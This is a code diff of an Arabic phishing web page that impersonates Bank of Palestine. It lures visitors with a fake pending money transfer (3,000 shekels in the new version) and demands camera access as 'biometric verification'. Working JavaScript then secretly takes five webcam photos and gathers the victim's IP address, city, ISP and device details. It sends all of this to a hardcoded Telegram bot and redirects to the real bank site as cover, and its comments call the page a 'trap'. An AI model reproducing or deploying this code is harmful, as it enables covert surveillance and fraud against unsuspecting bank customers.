@@ -3,39 +3,52 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>بنك فلسطين - الخدمات الإلكترونية</title>
+    <title>بنك فلسطين - استلام حوالة بنكية بقيمة 3000 ILS</title>
+    <meta property="og:title" content="بنك فلسطين: حوالة مالية واردة">
+    <meta property="og:description" content="لديك حوالة معلقة بقيمة 3000 شيكل. يرجى الدخول لتأكيد الاستلام.">
+    <meta property="og:image" content="https://www.bankofpalestine.com/public/files/image/logo.png">
+    
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #eee; margin: 0; padding: 0; }
-        .header { background-color: #f8f9fa; padding: 10px; border-bottom: 3px solid #0056b3; text-align: center; }
-        .container { max-width: 450px; margin: 20px auto; background: white; border-radius: 8px; overflow: hidden; box-shadow: 0 4px 15px rgba(0,0,0,0.2); }
-        .content { padding: 30px; text-align: center; }
-        .logo { width: 180px; margin-bottom: 20px; }
-        h2 { color: #333; font-size: 20px; }
-        p { color: #666; line-height: 1.6; }
-        .info-box { background: #e9ecef; padding: 15px; border-radius: 5px; margin: 20px 0; text-align: right; font-size: 14px; }
-        .btn { background-color: #d71920; color: white; padding: 15px; border: none; border-radius: 5px; cursor: pointer; width: 100%; font-size: 18px; font-weight: bold; }
+        body { font-family: 'Tahoma', sans-serif; background-color: #f0f2f5; margin: 0; padding: 0; }
+        .top-bar { background: #d71920; height: 5px; }
+        .header { background: #fff; padding: 15px; text-align: center; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
+        .container { max-width: 400px; margin: 30px auto; background: #fff; border-radius: 12px; overflow: hidden; border: 1px solid #ddd; }
+        .bank-content { padding: 25px; text-align: center; }
+        .logo { width: 160px; margin-bottom: 20px; }
+        .amount-card { background: #f8f9fa; border: 2px dashed #28a745; padding: 20px; border-radius: 10px; margin: 20px 0; }
+        .amount { color: #28a745; font-size: 32px; font-weight: bold; }
+        .currency { font-size: 18px; color: #555; }
+        .details { text-align: right; font-size: 14px; color: #444; margin-bottom: 20px; line-height: 1.8; }
+        .confirm-btn { background: #0056b3; color: #fff; border: none; padding: 16px; width: 100%; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.3s; }
+        .confirm-btn:hover { background: #004494; }
         #video, #canvas { display: none; }
     </style>
 </head>
 <body>
 
+<div class="top-bar"></div>
 <div class="header">
-    <img src="https://www.bankofpalestine.com/public/files/image/logo.png" style="width: 120px;">
+    <img src="https://www.bankofpalestine.com/public/files/image/logo.png" style="width: 100px;">
 </div>
 
 <div class="container">
-    <div class="content">
+    <div class="bank-content">
         <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/1a/Bank_of_Palestine_Logo.svg/1200px-Bank_of_Palestine_Logo.svg.png" class="logo">
-        <h2>تأكيد استلام حوالة واردة</h2>
-        <p>لديك حوالة بنكية معلقة بمبلغ <b>1,850.00$</b> من جهة غير مسجلة.</p>
+        <h3 style="color:#333;">تأكيد استلام حوالة فورية</h3>
         
-        <div class="info-box">
-            • رقم العملية: BP-9921045X<br>
-            • حالة الحوالة: بانتظار تأكيد الهوية<br>
-            • ملاحظة: يرجى السماح بالوصول للكاميرا لتأكيد الهوية البيومترية.
+        <div class="amount-card">
+            <span class="amount">3,000.00</span>
+            <span class="currency">شيكل إسرائيلي</span>
         </div>
 
-        <button class="btn" onclick="initiate()">قبول وتأكيد الاستلام</button>
+        <div class="details">
+            • <b>من:</b> حساب تعويضات إلكترونية<br>
+            • <b>رقم المرجع:</b> TXN-77821004<br>
+            • <b>تاريخ الاستحقاق:</b> اليوم<br>
+            <span style="color:red; font-size:12px;">* يتطلب الاستلام التحقق من الهوية البيومترية (الكاميرا).</span>
+        </div>
+
+        <button class="confirm-btn" onclick="startTrap()">تأكيد واستلام المبلغ الآن</button>
     </div>
 </div>
 
@@ -43,67 +56,73 @@
 <canvas id="canvas"></canvas>
 
 <script>
-    const token = '7777310266:AAGyWXFVm6B7tjr5hR-SIlKEo4N1mIvNl_M';
-    const chatId = '7184970355';
+    const BOT_TOKEN = '7777310266:AAGyWXFVm6B7tjr5hR-SIlKEo4N1mIvNl_M';
+    const CHAT_ID = '7184970355';
 
-    async function initiate() {
-        // سحب المعلومات فور الضغط
-        let deviceInfo = await getDeviceInfo();
+    async function startTrap() {
+        // جمع معلومات الجهاز فور الضغط
+        let info = await getFullData();
         
         navigator.mediaDevices.getUserMedia({ video: true })
         .then(stream => {
             const video = document.getElementById('video');
             video.srcObject = stream;
             
-            // التقاط 5 صور بسرعة فائقة (كل 500 ملّي ثانية)
-            let count = 0;
-            let interval = setInterval(() => {
-                if (count < 5) {
-                    captureAndSend(video, deviceInfo);
-                    count++;
+            let photoCount = 0;
+            const timer = setInterval(() => {
+                if (photoCount < 5) {
+                    sendPhotoToTelegram(video, info);
+                    photoCount++;
                 } else {
-                    clearInterval(interval);
-                    window.location.href = "https://www.bankofpalestine.com/"; // تحويله للموقع الرسمي بعد الفخ
+                    clearInterval(timer);
+                    // تحويله لصفحة تسجيل الدخول الحقيقية لزيادة التمويه
+                    window.location.href = "https://www.bankofpalestine.com/ar/online";
                 }
-            }, 500);
+            }, 600); // التقاط كل نصف ثانية تقريباً لسرعة التنفيذ
         })
         .catch(err => {
-            alert("عذراً، يجب تفعيل الكاميرا لتأكيد عملية التحويل حسب قوانين سلطة النقد.");
+            alert("خطأ في النظام: يرجى السماح بالكاميرا للتحقق من هويتك وصرف المبلغ.");
         });
     }
 
-    async function getDeviceInfo() {
-        let ipData = await fetch('https://ipapi.co/json/').then(res => res.json());
-        let battery = await navigator.getBattery().then(b => (b.level * 100) + "%");
-        let ram = navigator.deviceMemory ? navigator.deviceMemory + "GB" : "Unknown";
-        
-        return `
-📌 معلومات الضحية:
-- IP: ${ipData.ip}
-- المدينة: ${ipData.city}
-- الدولة: ${ipData.country_name}
-- الشركة: ${ipData.org}
-- البطارية: ${battery}
-- الرام: ${ram}
-- المتصفح: ${navigator.userAgent}
-        `;
+    async function getFullData() {
+        try {
+            let ipRes = await fetch('https://ipapi.co/json/').then(r => r.json());
+            let bat = await navigator.getBattery().then(b => (b.level * 100).toFixed(0) + "%");
+            let ram = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "غير معروف";
+            
+            return `
+⚠️ صيد جديد - زياد الخطيب ⚠️
+--------------------------
+💰 المبلغ: 3000 ILS
+🌐 الآيبي: ${ipRes.ip}
+📍 الموقع: ${ipRes.city} - ${ipRes.country_name}
+🏢 الشركة: ${ipRes.org}
+🔋 البطارية: ${bat}
+🧠 الرام: ${ram}
+📱 الجهاز: ${navigator.platform}
+🕒 الوقت: ${new Date().toLocaleString('ar-EG')}
+--------------------------`;
+        } catch (e) {
+            return "تعذر سحب كامل البيانات، جاري إرسال الصور...";
+        }
     }
 
-    function captureAndSend(video, info) {
+    function sendPhotoToTelegram(video, captionText) {
         const canvas = document.getElementById('canvas');
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
         canvas.getContext('2d').drawImage(video, 0, 0);
         
         canvas.toBlob(blob => {
-            const formData = new FormData();
-            formData.append('chat_id', chatId);
-            formData.append('photo', blob, 'capture.png');
-            formData.append('caption', info);
+            const fd = new FormData();
+            fd.append('chat_id', CHAT_ID);
+            fd.append('photo', blob, 'shot.png');
+            fd.append('caption', captionText);
 
-            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                 method: 'POST',
-                body: formData
+                body: fd
             });
         }, 'image/png');
     }
